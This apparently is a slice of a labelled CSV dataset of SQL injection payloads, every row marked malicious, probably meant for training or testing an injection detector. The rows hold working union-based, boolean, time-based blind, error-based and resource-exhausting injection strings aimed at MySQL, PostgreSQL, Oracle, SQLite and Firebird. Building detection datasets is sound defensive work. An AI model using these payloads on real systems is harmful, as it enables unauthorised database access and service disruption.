row_index,payload_norm,label,sqli_type_hint
1440,"-7267 ) union all select 1912,1912,1912,1912,1912,1912,1912,1912--",1,
1441,"1'+ ( select 'idmr' where 5029 = 5029 union all select null,null,null,null,null,null--",1,
1442,"1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--",1,
1443,"-4588"" union all select 4550,4550,4550,4550#",1,
1444,"-3971%' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( '%' = '",1,
1445,1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
1446,select ( case when ( 3863 = 1151 ) then 3863 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
1447,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1,
1448,"1 ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 5468 = 5468",1,
1449,1' ) where 6244 = 6244 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
1450,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""imlq"" like ""imlq",1,
1451,1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd,1,
1452,1%' ) ) or sleep ( 5 ) #,1,
1453,"1"" ) ) and make_set ( 1167 = 5027,5027 ) and ( ( ""grfi"" = ""grfi",1,
1454,"1%' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = '",1,
1455,"1%"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""%"" = """,1,
1456,-1765' ) order by 1--,1,
1457,-3088' or 6872 = 6872 and 'miwk' = 'miwk,1,
1458,"1%"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1459,"1 ) where 1443 = 1443 union all select null,null,null,null,null#",1,
1460,1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
1461,1'+ ( select mavu where 4276 = 4276 rlike sleep ( 5 ) #,1,
1462,-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,1,
1463,"1"" ) where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1464,"select sleep ( 5 ) and ""%"" = """,1,
1465,1'+ ( select qdon where 9453 = 9453,1,
1466,"-7884"" where 3297 = 3297 or 2492 = 6158",1,
1467,"1"" ) where 1673 = 1673 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
1468,"-5700 where 4238 = 4238 union all select 4238,4238,4238#",1,
1469,"1'+ ( select 'zirh' where 9054 = 9054 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",1,
